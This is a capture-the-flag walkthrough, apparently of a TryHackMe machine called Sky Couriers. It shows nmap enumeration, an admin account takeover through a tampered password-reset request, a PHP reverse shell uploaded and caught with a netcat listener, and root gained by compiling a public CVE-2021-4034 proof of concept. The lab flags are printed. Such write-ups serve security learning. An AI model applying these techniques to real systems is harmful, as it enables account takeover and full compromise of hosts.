# IP
10.10.190.155


## Enumeration
### Nmap
- Found two ports running on the machine

```console
❯ nmap -sC -sV 10.10.190.155 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 14:20 IST
Nmap scan report for 10.10.190.155
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sky Couriers
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.06 seconds
```

### Web
- On going to we page found a simple and a lot static website, except, search input and a login screen.
- Try using SQL Injection on the search input, but didn't find anything interesting.
- Tried SQL Injection on the login screen but didn't find anything interesting. 
- Then created a new user and logged in.
- There was nothing interesting on the dashboard but in profile, found an upload option but it was only allowed for `admin@sky.thm`.
- On the home screen there was an option to reset password, tried changing password for my user and intercepted the network with `BurpSuite`.
- Sent this request to `repeater` and edited the username to admin@sky.thm.
- Tried logging in with username `admin@sky.thm` and voila we are using the administrator account.
- Uploaded a php-reverse-shell to the Image option. 
- But we still don't know where is it stored.
- On looking at the page source found a comment
```html
<!-- /v2/profileimages/ -->
<script type="text/javascript">
        function showtab(tab){
          console.log(tab);
          if(tab == 'new_task'){
            $('#new_task').css('display','block');
            $('#your_task').css('display','none');
          }else{
            $('#new_task').css('display','none');
            $('#your_task').css('display','block');
          }
        }
      </script>
```
- This directory seems legit.



# Exploitation
## Web
On going to (http://10.10.190.155/v2/profileimages/php-reverse-shell.php) got the reverse shell.
```console
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.190.155] 32854
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 09:43:29 up 58 min,  0 users,  load average: 0.52, 0.15, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
- Upgraded the shell and found the user flag
```console
www-data@sky:/$ ls -a
.    boot   etc   lib32   lost+found  opt   run   srv	    tmp
..   cdrom  home  lib64   media       proc  sbin  swap.img  usr
bin  dev    lib   libx32  mnt	      root  snap  sys	    var
www-data@sky:/$ cd /home
www-data@sky:/home$ ls
webdeveloper
www-data@sky:/home$ cd webdeveloper/
www-data@sky:/home/webdeveloper$ ls
user.txt
www-data@sky:/home/webdeveloper$ cat user.txt
63191e4ece37523c9fe6bb62a5e64d45
```

- On loading `linpeas.sh` found this system vulnerable to [CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034)

### Privilege Escalation
- Downloaded [this](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c) exploit.
- Uploaded to the machine from local machine.
- Made an executable with `gcc` and executed it.
```console
www-data@sky:/tmp$ gcc cve-2021-4034-poc.c
www-data@sky:/tmp$ ls
a.out  cve-2021-4034-poc.c  cve-2021-4034.sh  linpeas.log  linpeas.sh  tmux-33
www-data@sky:/tmp$ ./a.out
# whoami
root
#
```
- We are root.
- Got root flag.
```console
# cat /root/root.txt
3a62d897c40a815ecbe267df2f533ac6
```
